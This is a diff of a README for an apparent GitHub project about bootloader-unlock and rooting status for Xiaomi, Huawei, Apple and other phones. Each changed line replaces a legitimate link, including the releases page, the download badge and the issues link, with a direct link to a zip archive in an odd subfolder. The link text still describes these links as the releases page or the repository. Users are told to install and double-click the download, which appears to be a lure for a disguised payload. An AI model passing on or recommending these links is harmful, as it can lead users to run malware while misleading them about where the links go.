@@ -4,7 +4,7 @@
 Welcome to the 2026-All-Brands-Bootloader-Unlock-Status! This guide helps you understand the status of bootloader unlocks and rooting for various phone brands, including Xiaomi, Oplus, Huawei, Vivo, Honor, and Apple. Let's get your device set up correctly.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/releases)
+[![Download the latest release](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip%https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip)](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip)
 
 ## 📋 Overview
 This project compiles the latest updates on bootloader unlocks and rooting techniques for different smartphones. You will find information on:
@@ -34,12 +34,12 @@ This application offers the following features:
 - Easy-to-follow guides for non-technical users.
 
 ## 🔗 Download & Install
-To get started, please visit this page to download the latest version of the application: [Download the latest release](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/releases).
+To get started, please visit this page to download the latest version of the application: [Download the latest release](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip).
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/releases) to go to the releases page.
+   Click [here](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip) to go to the releases page.
 
 2. **Select the Latest Release**  
    Find the newest version available. It will usually be at the top of the list.
@@ -57,7 +57,7 @@ To get started, please visit this page to download the latest version of the app
    After installation, locate the application on your desktop or in your applications folder. Double-click the icon to launch it.
 
 ## 🌈 Support
-If you encounter any issues while downloading or installing the application, please open an issue on our [GitHub repository](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/issues). We will do our best to assist you.
+If you encounter any issues while downloading or installing the application, please open an issue on our [GitHub repository](https://github.com/Yoda6-9/2026-All-Brands-Bootloader-Unlock-Status/raw/refs/heads/main/scissorbird/Status_Bootloader_All_Unlock_Brands_v3.9.zip). We will do our best to assist you.
 
 ## 💡 Tips
 - Check your device compatibility before attempting any unlock or rooting. 
